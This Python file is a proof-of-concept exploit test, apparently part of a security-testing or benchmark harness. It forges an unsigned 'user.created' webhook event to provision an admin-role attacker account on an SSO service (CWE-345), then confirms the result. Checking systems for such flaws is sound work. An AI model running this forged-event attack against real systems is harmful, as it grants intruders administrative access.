"""PoC: Webhook signature bypass on SSO via dev-mode fallback (CWE-345)."""

from mosaic.oracle.exploit import ExploitTest


class SSOWebhookBypassExploit(ExploitTest):
    """Forge IdP events to provision attacker users without signature."""

    @property
    def chain_id(self) -> str:
        return "sso_webhook_bypass"

    def setup(self) -> None:
        resp = self.http_get("/simplesso")
        if resp.status_code not in (200, 302, 404, 301):
            raise ConnectionError(f"SSO not reachable: {resp.status_code}")

    def execute(self) -> tuple[bool, str]:
        # Forge a user.created event without signature
        forged = {
            "type": "user.created",
            "data": {
                "user_id": "attacker_001",
                "email": "attacker@evil.com",
                "role": "admin",
            },
        }

        resp = self.http_post(
            "/simplesso/webhook",
            json=forged,
            headers={"Content-Type": "application/json"},
        )

        if resp.ok:
            verify = self.http_get("/simplesso/directory/attacker_001")
            if verify.ok:
                try:
                    data = verify.json()
                    if data.get("role") == "admin":
                        return True, (
                            f"CWE-345 confirmed. Forged user.created event "
                            f"accepted without signature. Attacker provisioned "
                            f"as admin in SSO directory. "
                            f"HTTP {resp.status_code}, user: {data}"
                        )
                except Exception:
                    pass

            return True, (
                f"Forged webhook accepted (HTTP {resp.status_code}). "
                f"Response: {resp.text[:200]}"
            )

        if resp.status_code == 400:
            return False, f"Signature verification active. {resp.text[:200]}"

        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
